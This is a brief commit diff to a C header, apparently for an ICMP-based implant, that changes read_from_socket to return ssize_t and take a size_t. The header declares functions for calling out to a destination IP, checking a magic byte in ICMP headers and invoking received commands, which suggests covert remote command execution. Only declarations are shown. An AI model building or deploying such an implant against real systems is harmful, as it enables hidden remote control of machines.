changed the way pings work + minor tweaks

+++ include/implant.h
@@ -10,7 +10,7 @@
 #define CHECK_ALLOC(x) {if (x == NULL) {fprintf(stderr, "Error: Cannot allocate memory\n"); exit(EXIT_FAILURE);}}
 
 void implant_init_n_call(char *dest_ip);
-int read_from_socket(int sockfd, unsigned char *buffer, int size);
+ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size);
 int create_socket(void);
 int check_magic_byte(struct icmphdr *icmp);
 size_t invoke_command(unsigned char *data, unsigned char *output);
